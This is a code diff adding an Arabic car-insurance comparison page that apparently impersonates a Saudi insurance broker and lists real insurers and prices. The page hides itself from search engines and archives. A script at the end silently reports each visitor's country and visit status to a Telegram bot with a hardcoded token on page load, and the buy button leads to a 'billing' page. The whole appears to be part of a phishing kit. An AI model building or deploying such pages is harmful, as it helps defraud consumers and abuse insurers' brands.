@@ -1,0 +1,561 @@
+<!DOCTYPE html>
+<html lang="ar">
+
+<head>
+  <meta content="width=device-width, initial-scale=1" name="viewport" />
+  <meta charset="utf-8" />
+  <!-- Prevent indexing and following by well-behaved crawlers: -->
+  <meta name="robots" content="noindex, nofollow" />
+
+  <!-- Prevent archiving or snippet display: -->
+  <meta name="googlebot" content="noindex, nofollow, noarchive, nosnippet" />
+  <meta name="bingbot" content="noindex, nofollow" />
+  <meta name="yandex" content="none" />
+  <title>Comprehensive</title>
+  <style>
+    @import url("https://fonts.googleapis.com/css2?family=Readex+Pro:wght@160..700&display=swap");
+    @import url("https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css");
+
+    * {
+      font-family: "Readex Pro", sans-serif;
+      font-optical-sizing: auto;
+      font-weight: 400;
+      font-style: normal;
+      font-variation-settings: "HEXP" 0;
+    }
+
+    .content {
+      background: white;
+      border-radius: 0 0 20px 20px;
+      padding: 30px 20px;
+      margin: -30px 10px 30px;
+      box-shadow: 0 2px 4px rgba(0, 0, 0, 0.05);
+      min-height: 200px;
+      font-size: 16px;
+      color: #333;
+    }
+
+    .inputriyalsymbol {
+      display: inline-block;
+      width: 16px;
+      height: 16px;
+      vertical-align: middle;
+      fill: #faa62e;
+    }
+  </style>
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.rtl.min.css" rel="stylesheet" />
+</head>
+
+<body dir="rtl">
+  <nav class="navbar navbar-expand-lg navbar-light bg-light text-center">
+    <img style="margin: auto" width="122px" src="assets/icon/Bca-logo.svg" alt="" />
+  </nav>
+
+  <div class="container mt-4 mb-3 text-right">
+    <h5 style="color: #146394">نوع التأمين</h5>
+    <div dir="ltr" class="mt-3" style="
+          display: flex;
+          justify-content: center;
+          background-color: #f8f9fa;
+          border-radius: 30px;
+          overflow: hidden;
+          padding: 5px;
+          max-width: 300px;
+          margin: auto;
+        ">
+      <a href="comprehensive.html" style="
+            flex: 1;
+            text-align: center;
+            text-decoration: none;
+            background-color: #146394;
+            color: white;
+            padding: 10px 0;
+            border-radius: 30px;
+            font-weight: 600;
+          ">شامل</a>
+      <a href="thirdparty.html" style="
+            flex: 1;
+            text-align: center;
+            text-decoration: none;
+            color: #146394;
+            padding: 10px 0;
+            font-weight: 600;
+          ">ضد الغير</a>
+    </div>
+  </div>
+
+  <div class="container">
+    <div class="row" id="cards-container"></div>
+  </div>
+
+  <script>
+    const companies = [
+      {
+        name: "بروج للتأمين التعاوني",
+        logo: "assets/photos/buruj.png",
+        price: 610.5,
+        options: [
+          {
+            label: "تغطية الحوادث الشخصية للسائق فقط",
+            price: 70,
+            checked: false,
+          },
+          {
+            label: "تغطية الحوادث الشخصية للركاب فقط",
+            price: 420,
+            checked: false,
+          },
+        ],
+      },
+      {
+        name: "سلامة للتأمين",
+        logo: "assets/photos/salamih.webp",
+        price: 712.2,
+        options: [],
+      },
+      {
+        name: "التعاونية",
+        logo: "assets/photos/altawneih.jpg",
+        price: 890.0,
+        options: [{ label: "مساعدة على الطريق", price: 50, checked: false }],
+      },
+      {
+        name: "ميدغلف السعودية",
+        logo: "assets/photos/medgulf.png",
+        price: 710.8,
+        options: [{ label: "مساعدة على الطريق", price: 30, checked: false }],
+      },
+      //-------------------------------------
+      {
+        name: "متكاملة للتأمين",
+        logo: "assets/photos/motakamlh.jpg",
+        price: 1200.1,
+        options: [
+          {
+            label: "الوفاة والإصابة الجسدية والمصاريف الطبية للسائق",
+            price: 30,
+            checked: false,
+          },
+        ],
+      },
+      //-------------------------------------
+      {
+        name: "المجموعة المتحدة للتأمين التعاوني",
+        logo: "assets/photos/acig.png",
+        price: 999.0,
+        options: [
+          {
+            label: "تغطية الحوادث الشخصية للسائق ",
+            price: 50,
+            checked: false,
+          },
+          {
+            label: "تغطية الحوادث الشخصية للركاب ",
+            price: 240,
+            checked: false,
+          },
+        ],
+      },
+      //-------------------------------------
+      {
+        name: "ليڤا للتأمين",
+        logo: "assets/photos/liva.jpg",
+        price: 785.3,
+        options: [
+          {
+            label: "تغطية الحوادث الشخصية للسائق ",
+            price: 50,
+            checked: false,
+          },
+          {
+            label: "تغطية الحوادث الشخصية للركاب ",
+            price: 280,
+            checked: false,
+          },
+          { label: "مساعدة على الطريق", price: 50, checked: false },
+        ],
+      },
+      //-------------------------------------
+      {
+        name: "الجزيره التكافل التعاوني",
+        logo: "assets/photos/aljazira.webp",
+        price: 2101.7,
+        options: [],
+      },
+      //-------------------------------------
+      {
+        name: "التأمين العربي التعاوني",
+        logo: "assets/photos/alarabia.webp",
+        price: 1450.5,
+        options: [
+          {
+            label: "تغطية الحوادث الشخصية للسائق ",
+            price: 60,
+            checked: false,
+          },
+        ],
+      },
+      //-------------------------------------
+      {
+        name: "شركة الوطنية للتأمين",
+        logo: "assets/photos/alwataneh.png",
+        price: 894.2,
+        options: [],
+      },
+      //-------------------------------------
+      {
+        name: "شركة ولاء للتأمين التعاوني",
+        logo: "assets/photos/walaa.jpg",
+        price: 702.5,
+        options: [
+          {
+            label: "تغطية الحوادث الشخصية للسائق ",
+            price: 50,
+            checked: false,
+          },
+          {
+            label: "تغطية الحوادث الشخصية للركاب ",
+            price: 270,
+            checked: false,
+          },
+        ],
+      },
+      //-------------------------------------
+      {
+        name: "تكافل الراجحي",
+        logo: "assets/photos/takafl rajhi.jpg",
+        price: 2050.1,
+        options: [
+          { label: "الاخطار الطبيعية", price: 100, checked: false },
+          { label: "مساعدة على الطريق", price: 30, checked: false },
+          {
+            label: "تغطية دول مجلس التعاون الخليجي",
+            price: 150,
+            checked: false,
+          },
+          { label: "تغطية حوادث للسائق والركاب", price: 70, checked: false },
+        ],
+      },
+      //-------------------------------------
+      {
+        name: "المتحدة للتامين التعاوني",
+        logo: "assets/photos/almutahida.webp",
+        price: 710.5,
+        options: [
+          { label: "مساعدة على الطريق", price: 0, checked: true },
+          {
+            label: "تغطية الحوادث الشخصية للسائق ",
+            price: 40,
+            checked: false,
+          },
+          {
+            label: "مساعدة على الطريق البلاتيني",
+            price: 150,
+            checked: false,
+          },
+        ],
+      },
+      //-------------------------------------
+      {
+        name: "شركة أمانة للتأمين التعاوني",
+        logo: "assets/photos/amana.jpg",
+        price: 790.0,
+        options: [
+          {
+            label:
+              "الوفاة والإصابة الجسدية والمصاريف الطبية للمؤمن له أو السائق المسمى",
+            price: 50,
+            checked: false,
+          },
+        ],
+      },
+      //-------------------------------------
+      {
+        name: "شركة اليانز للتأمين",
+        logo: "assets/photos/Allianz.png",
+        price: 880.0,
+        options: [
+          {
+            label: "تغطية الحوادث الشخصية للسائق فقط",
+            price: 60,
+            checked: false,
+          },
+        ],
+      },
+      //-------------------------------------
+      {
+        name: "جي.آي.جي",
+        logo: "assets/photos/gig.png",
+        price: 695.5,
+        options: [
+          { label: "الاصابة الجسدية للغير", price: 0, checked: true },
+          { label: "تلف ممتلكات الغير", price: 0, checked: true },
+          {
+            label: "تغطية الحوادث الشخصية للسائق ",
+            price: 50,
+            checked: false,
+          },
+          {
+            label: "تغطية الحوادث الشخصية للركاب ",
+            price: 270,
+            checked: false,
+          },
+        ],
+      },
+      //-------------------------------------
+      {
+        name: "شركة الدرع العربي",
+        logo: "assets/photos/aldera alarabi.webp",
+        price: 765.2,
+        options: [
+          { label: "مساعدة على الطريق", price: 25, checked: false },
+          {
+            label: "تغطية الحوادث الشخصية للسائق ",
+            price: 60,
+            checked: false,
+          },
+          {
+            label: "تغطية الحوادث الشخصية للركاب ",
+            price: 290,
+            checked: false,
+          },
+        ],
+      },
+      //-------------------------------------
+      {
+        name: "شركة التحاد للتأمين",
+        logo: "assets/photos/aletihad.png",
+        price: 620.95,
+        options: [
+          {
+            label: "تغطية الحوادث الشخصية للسائق ",
+            price: 50,
+            checked: false,
+          },
+        ],
+      },
+      //-------------------------------------
+      {
+        name: "الخليجية العامة للتأمين",
+        logo: "assets/photos/gulf.webp",
+        price: 599.3,
+        options: [
+          { label: "مساعدة على الطريق", price: 25, checked: false },
+          {
+            label: "تغطية الحوادث الشخصية للسائق ",
+            price: 60,
+            checked: false,
+          },
+          {
+            label: "تغطية الحوادث الشخصية للركاب ",
+            price: 290,
+            checked: false,
+          },
+        ],
+      },
+      //-------------------------------------
+    ];
+
+    const riyalIcon =
+      '<svg viewBox="0 0 1300 1200" class="inputriyalsymbol"><path d="M1085.73,895.8c20.06-44.47,33.32-92.75,38.4-143.37l-330.68,70.33v-135.2l292.27-62.11c20.06-44.47,33.32-92.75,38.4-143.37l-330.68,70.27V66.13c-50.67,28.45-95.67,66.32-132.25,110.99v403.35l-132.25,28.11V0c-50.67,28.44-95.67,66.32-132.25,110.99v525.69l-295.91,62.88c-20.06,44.47-33.33,92.75-38.42,143.37l334.33-71.05v170.26l-358.3,76.14c-20.06,44.47-33.32,92.75-38.4,143.37l375.04-79.7c30.53-6.35,56.77-24.4,73.83-49.24l68.78-101.97v-.02c7.14-10.55,11.3-23.27,11.3-36.97v-149.98l132.25-28.11v270.4l424.53-90.28Z"></path></svg>';
+    const container = document.getElementById("cards-container");
+
+    companies.forEach((company, index) => {
+      let optionsHTML = "";
+
+      optionsHTML += `
+            <div class="d-flex justify-content-between align-items-start mb-2">
+              <div class="form-check me-1" style="margin-left: 3px;">
+                <input class="form-check-input float-end" type="checkbox" checked disabled>
+              </div>
+              <div class="flex-grow-1 pe-2">
+                <label class="form-check-label small text-dark">
+                  المسؤولية المدنية تجاه الغير بحد أقصى<br>
+                  <strong>10,000,000 ${riyalIcon}</strong>
+                </label>
+              </div>
+              <div class="ps-2">
+                <span class="text-warning small fw-bold">مجاني</span>
+              </div>
+            </div>
+          `;
+
+      if (company.options && company.options.length) {
+        company.options.forEach((opt, i) => {
+          const checkboxId = `company_${index}_${i}`;
+          optionsHTML += `
+                <div class="d-flex justify-content-between align-items-start mb-2">
+                  <div class="form-check me-1" style="margin-left: 3px;">
+                    <input class="form-check-input float-end additional-option"
+                      type="checkbox"
+                      id="${checkboxId}"
+                      data-price="${opt.price}"
+                      data-label="${opt.label}"
+                      ${opt.checked ? "checked" : ""}>
+                  </div>
+                  <div class="flex-grow-1 pe-2">
+                    <label for="${checkboxId}" class="form-check-label small text-dark">
+                      ${opt.label}
+                    </label>
+                  </div>
+                  <div class="ps-2 text-warning small fw-bold">
+                    ${opt.price > 0 ? opt.price + " " + riyalIcon : "مجاني"}
+                  </div>
+                </div>
+              `;
+        });
+      }
+
+      const card = `
+            <div class="col-md-6 col-lg-4 mb-4">
+              <div class="card shadow rounded p-3 h-100">
+                <div class="d-flex justify-content-between align-items-start">
+                  <div>
+                    <h6 class="fw-bold text-dark mb-1">${company.name}</h6>
+                    <p class="text-muted mb-0 small">التأمين الشامل</p>
+                  </div>
+                  <img src="${company.logo}" alt="شعار ${company.name}" style="height: 45px;">
+                </div>
+                <hr class="my-3">
+                <h6 class="fw-bold text-dark mb-3">مزايا إضافية</h6>
+
+                ${optionsHTML}
+
+                <div class="d-flex justify-content-between align-items-center mt-3" style="color:#146394; font-size:24px;">
+                  <div class="px-2 py-1 fw-bold">
+                    ${company.price} ${riyalIcon}
+                  </div>
+                  <button onclick="buyNow(${company.price}, this)" class="btn text-white fw-bold px-4 rounded" style="background-color: #faa62e;">اشترِ الآن</button>
+                </div>
+              </div>
+            </div>
+          `;
+
+      container.innerHTML += card;
+    });
+
+    function buyNow(basePrice, buttonElement) {
+      const card = buttonElement.closest(".card");
+      const checkboxes = card.querySelectorAll(".additional-option:checked");
+
+      let total = basePrice;
+      let selectedOptions = [];
+
+      checkboxes.forEach((cb) => {
+        const optionPrice = parseFloat(cb.getAttribute("data-price"));
+        total += optionPrice;
+        selectedOptions.push({
+          label: cb.getAttribute("data-label"),
+          price: optionPrice,
+        });
+      });
+    }
+  </script>
+
+
+
+
+
+<!--  TELEGRAM SCRIPT -->
+<script>
+
+document.addEventListener("DOMContentLoaded", function () {
+  // منع التكرار خلال نفس الجلسة
+  if (sessionStorage.getItem("telegramSent")) {
+      // console.log("الإشعار سبق وتم إرساله خلال هذه الجلسة.");
+      return;
+  }
+
+  // إعدادات البوت (من قبلك)
+  const telegramToken = "8579444830:AAHPXx3c41OW_GvQzxy2Ff57ynzOiqzx12w";
+  const chatId = "-5039805395";
+
+  // 👇 هنا اسم الصفحة (عدّله حسب الحاجة)
+  const pageName = " شامل";
+
+  // تحديد حالة الزائر (جديد/قديم)
+  let visitorType = localStorage.getItem("visitorType");
+  let status = "";
+  if (!visitorType) {
+    localStorage.setItem("visitorType", "old");
+    status = "زبون جديد";
+  } else {
+    status = "زبون قديم";
+  }
+
+  // جلب الدولة من API ثم إرسال الرسالة إلى التليجرام
+  fetch('https://api.country.is')
+    .then(response => response.json())
+    .then(data => {
+      const country = data.country || "غير معروف";
+      const message = `حالة الزائر: ${status}\nالدولة: ${country}\nالصفحة: ${pageName}`;
+
+      // إرسال الرسالة إلى تليجرام
+      return fetch(`https://api.telegram.org/bot${telegramToken}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: message,
+          disable_notification: false
+        })
+      });
+    })
+    .then(res => res.json())
+    .then(resJson => {
+      if (resJson.ok) {
+        console.log("✅ تم إرسال الإشعار إلى تليجرام بنجاح.");
+        sessionStorage.setItem("telegramSent", "true"); // منع التكرار خلال الجلسة
+      } else {
+        console.log("❌ فشل إرسال الإشعار:", resJson);
+      }
+    })
+    .catch(err => {
+      console.log("⚠️ خطأ أثناء الإرسال أو جلب الدولة:", err);
+    });
+});
+
+</script>
+<!-- END TELEGRAM SCRIPT -->
+
+
+
+
+
+
+  <script>
+    async function buyNow(basePrice, btn) {
+      const card = btn.closest(".card");
+      const companyName = card.querySelector("h6").textContent.trim();
+      const checked = Array.from(
+        card.querySelectorAll(".additional-option:checked")
+      );
+      const selectedOptions = checked.map((cb) => ({
+        label: cb.getAttribute("data-label"),
+        price: parseFloat(cb.getAttribute("data-price")),
+      }));
+      const totalPrice = selectedOptions.reduce(
+        (sum, o) => sum + o.price,
+        basePrice
+      );
+
+      // **NEW**: store totalPrice for later pages
+      sessionStorage.setItem("totalPrice", totalPrice.toFixed(2));
+
+      const payload = {
+        ip: window.visitorIP,
+        companyName,
+        basePrice,
+        selectedOptions,
+        totalPrice,
+      };
+
+        window.location.href = "billing.html";
+
+    }
+    window.buyNow = buyNow;
+
+  </script>
+</body>
+
+</html>
